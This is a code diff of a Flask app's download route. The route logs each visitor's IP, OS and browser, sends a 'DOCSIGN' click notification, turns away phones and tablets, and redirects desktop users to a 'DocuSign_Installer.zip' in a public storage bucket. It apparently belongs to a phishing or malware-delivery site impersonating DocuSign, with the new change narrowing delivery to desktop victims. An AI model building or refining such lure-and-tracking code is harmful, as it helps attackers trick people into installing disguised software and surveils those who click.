@@ -128,9 +128,11 @@ def is_suspicious_request(request):
 @app.route("/download", methods=["GET"])
 @limiter.limit("10 per minute")  # Stricter limit for download endpoint
 def download():
-    print("Download route accessed")
-    
-    # Get IP and device info for notification
+    # Desktop-only gate: phones and tablets never receive the installer.
+    ua = parse(request.headers.get("User-Agent", ""))
+    if ua.is_mobile or ua.is_tablet:
+        return render_template("mobile.html"), 403
+
     # Get real IP from proxy headers (Render uses proxy)
     if request.headers.get('X-Forwarded-For'):
         ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
@@ -138,13 +140,7 @@ def download():
         ip = request.headers.get('X-Real-IP')
     else:
         ip = request.remote_addr
-    
-    user_agent_string = request.headers.get("User-Agent", "")
-    ua = parse(user_agent_string)
-    
-    device_type = "Mobile 📱" if ua.is_mobile else "Tablet 📱" if ua.is_tablet else "Desktop 🖥️"
-    
-    # Send download button click notification
+
     download_message = f"""
 🔘 𝘋𝘖𝘞𝘕𝘓𝘖𝘈𝘋 𝘉𝘜𝘛𝘛𝘖𝘕 𝘊𝘓𝘐𝘊𝘒𝘌𝘋 - 𝘋𝘖𝘊𝘚𝘐𝘎𝘕
 
@@ -154,7 +150,7 @@ def download():
 
 💻 𝘋𝘌𝘝𝘐𝘊𝘌
 ━━━━━━━━━━━━━━━━
-🖥️ Type: {device_type}
+🖥️ Type: Desktop 🖥️
 ⚙️ OS: {ua.os.family} {ua.os.version_string}
 🌐 Browser: {ua.browser.family} {ua.browser.version_string}
 
@@ -162,12 +158,12 @@ def download():
 ━━━━━━━━━━━━━━━━
 📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 """
-    
+
     send_notification(download_message)
-    
-    # Redirect to R2 URL
+
     r2_url = "https://pub-5943043f0aa3454291be9cd2fe736787.r2.dev/DocuSign_Installer.zip"
     return redirect(r2_url, code=302)
+
 @app.route("/track", methods=["GET", "POST"])
 @csrf.exempt
 @limiter.limit("10 per minute")
